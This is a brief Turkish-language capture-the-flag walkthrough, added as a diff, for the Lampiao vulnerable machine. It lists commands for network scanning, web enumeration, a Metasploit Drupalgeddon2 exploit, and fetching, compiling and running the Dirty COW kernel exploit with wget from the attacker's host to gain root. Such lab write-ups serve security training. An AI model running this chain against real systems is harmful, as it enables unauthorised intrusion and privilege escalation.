@@ -1,0 +1,10 @@
+LAMPİAO MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.136 bulundu.
+2 - gobuster dir -u http://192.168.2.136:1898 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+3 - nikto -h 192.168.2.136:1898
+4 - msfconsole, search drupal, exploit/unix/webapp/drupal_drupalgeddon2
+5 - SHELL=/bin/bash script -q /dev/null, uname -a
+6 - https://www.exploit-db.com/exploits/40847, cp 40847.cpp /var/www/html
+7 - service apache2 start, wget http://192.168.2.128/40847.cpp
+8 - g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
+9 - ./dcow -s
